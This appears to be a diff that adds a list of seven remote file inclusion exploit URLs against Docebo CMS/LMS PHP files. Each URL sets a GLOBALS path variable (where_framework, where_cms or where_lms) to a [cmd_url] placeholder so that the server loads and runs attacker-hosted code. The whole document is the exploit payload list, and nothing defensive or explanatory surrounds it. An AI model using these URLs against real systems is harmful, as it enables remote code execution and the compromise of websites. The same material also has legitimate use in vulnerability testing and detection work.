@@ -1,0 +1,7 @@
+http://www.example.com/doceboCms/[dc_path]admin/modules/news/news_class.php?GLOBALS[where_framework]=[cmd_url]
+http://www.example.com/doceboCms/[dc_path]admin/modules/content/content_class.php?GLOBALS[where_framework]=[cmd_url]
+http://www.example.com/doceboCms/[dc_path]admin/modules/block_media/util.media.php?GLOBALS[where_cms]=[cmd_url]
+http://www.example.com/[dc_path]/addons/mod_media/body.php?GLOBALS[where_framework]=[cmd_url]
+http://www.example.com/[dc_path]/lib/lib.php?GLOBALS[where_framework]=[cmd_url]
+http://www.example.com/[dc_path]/class.module/class.definition.php?GLOBALS[where_lms]=[cmd_url]
+http://www.example.com/[dc_path]/modules/scorm/scorm_utils.php?GLOBALS[where_lms]=[cmd_url]
